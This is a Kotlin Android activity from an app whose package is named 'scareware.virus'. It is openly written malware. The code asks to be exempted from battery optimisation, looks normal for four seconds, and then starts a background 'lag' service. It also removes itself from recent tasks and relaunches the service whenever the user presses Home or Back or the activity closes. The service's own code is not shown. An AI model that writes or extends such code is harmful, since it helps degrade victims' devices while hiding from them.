package com.scareware.virus

import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import androidx.appcompat.app.AppCompatActivity

class MainActivity : AppCompatActivity() {

    private val handler = Handler(Looper.getMainLooper())

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        // Request ignore battery optimization so service survives longer
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
                intent.data = Uri.parse("package:$packageName")
                startActivity(intent)
            }
        } catch (_: Exception) {}

        // After a few seconds looking "normal", start lag service and hide
        handler.postDelayed({
            startLagService()
            // Hide from recents and finish
            finishAndRemoveTask()
        }, 4000)
    }

    private fun startLagService() {
        val svc = Intent(this, LagService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(svc)
        } else {
            startService(svc)
        }
    }

    override fun onUserLeaveHint() {
        // User pressed Home / switched app → start lag and disappear
        startLagService()
        finishAndRemoveTask()
    }

    override fun onBackPressed() {
        startLagService()
        finishAndRemoveTask()
    }

    override fun onDestroy() {
        startLagService()
        super.onDestroy()
    }
}
